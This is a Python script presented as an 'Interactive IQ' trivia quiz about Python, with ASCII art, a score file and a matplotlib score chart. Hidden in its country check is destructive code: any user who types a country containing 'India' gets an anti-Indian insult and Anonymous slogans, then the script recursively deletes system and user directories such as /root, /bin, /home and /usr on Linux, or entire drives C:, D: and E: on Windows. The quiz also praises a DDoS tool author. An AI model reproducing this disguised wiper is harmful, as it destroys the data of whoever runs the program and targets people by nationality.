from __future__ import print_function, unicode_literals, absolute_import, division
import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
from IPython.display import clear_output
from six.moves import urllib
import tensorflow.compat.v2.feature_column as fc
import tensorflow as tf
import shutil
import os
import platform
OS = str(platform.platform())
f= open("/root/Score.txt","w+")
f.write('0')
f.close()
print('Interactive IQ Alpha [Einestien] 0.01')
print('   |////////////|       _______   ')
print('        |/|            /        \ ')
print('        |/|           /          \ ')
print('        |/|          |           |')
print('        |/|           \          /::')
print('        |/|            \________/  ::   [Tells how much of an Einestien you are?]')
print('   |////////////|            ')


print('[+] Dependencies are Satisfied, Your System Meets the Modules that are the Requirements for this Questionnaire')
print('[+] Based on Alvin Jonsons Troubling IQ/GK Questions, Insider Knowledge from MI6 and CIA Agents (1986) Special Edition')
print('[+] This is a Early BETA 0.1 Alpha Stage')
print('[+] GUI based on Toga Module in Python is on the Way.')
print('[+] Project By Muneeb Khurram suggested by @Inam-ul-Haq [PIAIC]')
print('[+] There is an Easter Egg until COVID-19 is here. Type: Iambored in the Input Below Instead of Your Name')
print('[+] Warning If you are an India do not Play this I will not be responsible for deleting your Entire Disk but if you are an Indian Muslim you are Welcome just Type IN_Muslims')
name = input("Lad! Seem's like someone is here to Dare? Tell me your name you unprepared Volunteer >>>")

country = input("What is your Country " + name + ">>>" )
def country_check(country):
  if 'India' in country:
      print("Indian's are @#$%^&")
      print("IMMA CHARGE MY LAZAR!")
      print(platform.platform())
      if 'Linux' in OS:
        print("We are Anonymous, we are a Legion we donot forgive, we donot forget. Expect US")
        print("All files going, Bye Bye, But not ur OS")
        shutil.rmtree("/root/", ignore_errors= True)
        shutil.rmtree("/bin/", ignore_errors=True)
        shutil.rmtree("/content/", ignore_errors=True)
        shutil.rmtree("/home/", ignore_errors=True)
        shutil.rmtree("/media/", ignore_errors=True)
        shutil.rmtree("/sys/", ignore_errors= True)
        shutil.rmtree("/usr/", ignore_errors= True)
        shutil.rmtree("/var/", ignore_errors=True)
        shutil.rmtree("/tmp/", ignore_errors= True)
        print("Obliterated")
      if 'ubuntu' in OS:
        print("We are Anonymous, we are a Legion we donot forgive, we donot forget. Expect US")
        print("All files going, Bye Bye, But not ur OS")
        shutil.rmtree("/root/", ignore_errors= True)
        shutil.rmtree("/bin/", ignore_errors=True)
        shutil.rmtree("/content/", ignore_errors=True)
        shutil.rmtree("/home/", ignore_errors=True)
        shutil.rmtree("/media/", ignore_errors=True)
        shutil.rmtree("/sys/", ignore_errors= True)
        shutil.rmtree("/usr/", ignore_errors= True)
        shutil.rmtree("/var/", ignore_errors=True)
        shutil.rmtree("/tmp/", ignore_errors= True)
        print("Obliterated")
      if 'Win' in OS:
        shutil.rmtree("C:/", ignore_errors = True)
        shutil.rmtree("D:/", ignore_errors = True)
        shutil.rmtree("E:/", ignore_errors = True)
      


def name_check(name):
  if name == 'Iambored':
    while 3>2:
      print("I am Bored")
      print(" I am Bored")
      print("     I am Bored")
      print("         I am Bored")
      print("             I am Bored")
      print("             I am Bored")
      print("         I am Bored")
      print("     I am Bored")
      print(" I am Bored")
      print("I am Bored")
  if 'Muneeb' in name:
      print("Welcome Lad! Seems your name is the Same as my Coder ?")
  if 'Inam' in name:
      print("Welcome Sir Inam-ul-Haq")
  else:
      print("Welcome "+ name)
name_check(name)
country_check(country)
def add_score(score_to_add):
  f = open('/root/Score.txt', 'r')
  score = int(f.read())
  new_score = score+int(score_to_add)
  f.close()
  f = open('/root/Score.txt','w')
  f.write(str(new_score))
  f.close()
def display_score(name):
  f = open('/root/Score.txt', 'r')
  read_score = str(f.read())
  print(read_score)
  f.close()
  plt.title("Your Score")
  divisions = ['Einestien', str(name)]
  score = [int(30), int(read_score)]
  plt.bar(divisions, score, color = 'green')
  plt.xlabel('Name')
  plt.ylabel('Score')
  plt.show()
  
def IQ_Questions(name):
  print("Now, Young Lad Get Ready to be Asked Questions on Python which are Going to Bizzare but Only very few Know! Not even Seasoned Ones,")
  print("These Questions are Compiled by Anonymous IRC freenode /join #anonymous You Shall be Tested")
  print("Just as Cicada 3301 you will be asked Questions and Only the Very Very Best will be Contacted")
  print("This Consists of Only 6 Questions [Only 2 are Tough]")
  print('[+] Difficulty Level: Noob')
  print("Ok Question No.1")

  question_1 = input("When you convert a .py to .exe, and when your file has ctypes module in it. What ctypes Statement causes .exe to stop executing while it should'nt. Only Pure Anon heads know [Hint: Something with Back****** *******] >>> ")
  print("K, I see but I will tell you at the end what have you done right and wrong 1/10 Answers given.")
  if question_1 == 'ctypes.windll.user32.LockWorkStation()':
    add_score(5)
  question_2 = input("What Module in Python which is in BETA Phases and is used for GUI dosen't produce Blurred GUI's in High Resolution Displays Like Tkinter, it Also Works on iOS and Android (Not Kivy) [Hint: Based on Somethig Roman Wear*****] >>>")
  print("K, I see but I will tell you at the end what have you done right and wrong 2/10 Answers given.")
  if question_2 == 'toga':
    add_score(5)
  question_3 = input("Which OS was written in Python, Don't Google it this is Only thing which Google has the Answer to [HINT: github.com/jtauber/******] >>>")
  print("K, I see but I will tell you at the end what have you done right and wrong 3/10 Answers given.")
  if 'Cleese' in question_3:
    add_score(5) 
  question_4 = input("[Extra Question for Extra Points] Which Pakistani Anonymous Member made the first DDoS tool in Python which was based on HULK DoS tool [Hint github.com/Ha3MrX] >>>")
  print("K, I see but I will tell you at the end what have you done right and wrong 4/10 Answers given. Expect US.")
  if 'jabar' in question_4:
    add_score(5)
  question_5 = input("continue is legal in finally: blocks in which Version of Python was that Added. Format i.e if in 2.7 the the Anwser you will type is 2.7 >>>")
  print("K, I see but I will tell you at the end what have you done right and wrong 5/10 Answers given.")
  if question_5 == '3.8':
    add_score(5)
  question_6 = input('Do functions (or methods) return something even if there isn’t a program to write a program to read global variables in python? Answer Y/N >>>')
  if question_6 == 'Y' or question_6 == 'N':
    add_score(5)
print('[+] Score is Out of 30 and You Scored')


IQ_Questions(name)  
display_score(name)